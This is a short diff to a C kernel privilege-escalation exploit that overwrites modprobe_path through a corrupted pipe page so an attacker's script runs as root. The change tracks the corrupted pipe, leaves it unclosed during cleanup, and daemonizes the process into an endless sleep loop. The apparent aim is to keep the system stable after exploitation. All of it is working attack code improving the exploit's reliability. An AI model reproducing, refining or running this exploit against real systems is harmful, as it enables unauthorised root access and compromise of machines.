@@ -284,6 +284,7 @@ int main(void)
 	char privesc_script_path[KMOD_PATH_LEN] = { 0 };
 	int act_fd = -1;
 	long i = 0;
+	long corrupted_pipe_n = 0;
 	int pipe_fds[PIPES_N][2];
 	char *pipe_data = NULL;
 	ssize_t bytes = -1;
@@ -400,16 +401,17 @@ int main(void)
 			continue;
 
 		printf("[+] modprobe_path %s is found in the pipe %ld\n", modprobe_path, i);
+		corrupted_pipe_n = i;
 
 		/* Write the page with modified modprobe_path back to the pipe */
-		bytes = write(pipe_fds[i][1], pipe_data, PAGE_SIZE);
+		bytes = write(pipe_fds[corrupted_pipe_n][1], pipe_data, PAGE_SIZE);
 		if (bytes != PAGE_SIZE) {
 			printf("[-] write to pipe returned %zd\n", bytes);
 			goto end;
 		}
 
 		printf("[+] wrote the page containing new modprobe_path %s back to the pipe %ld\n",
-				privesc_script_path, i);
+				privesc_script_path, corrupted_pipe_n);
 		break;
 	}
 
@@ -453,6 +455,9 @@ end:
 		free(pipe_data);
 
 	for (i = 0; i < PIPES_N; i++) {
+		if (i == corrupted_pipe_n)
+			continue;
+
 		if (pipe_fds[i][0] >= 0) {
 			if (close(pipe_fds[i][0]) < 0)
 				perror("[-] close pipe");
@@ -467,6 +472,12 @@ end:
 		printf("\n[-] exploit failed\n");
 	else
 		printf("\n[+] success, the end\n");
+
+	ret = daemon(1, 1);
+	if (ret != 0)
+		perror("[-] daemon");
+	while (1)
+		sleep(42);
 
 	return result;
 }
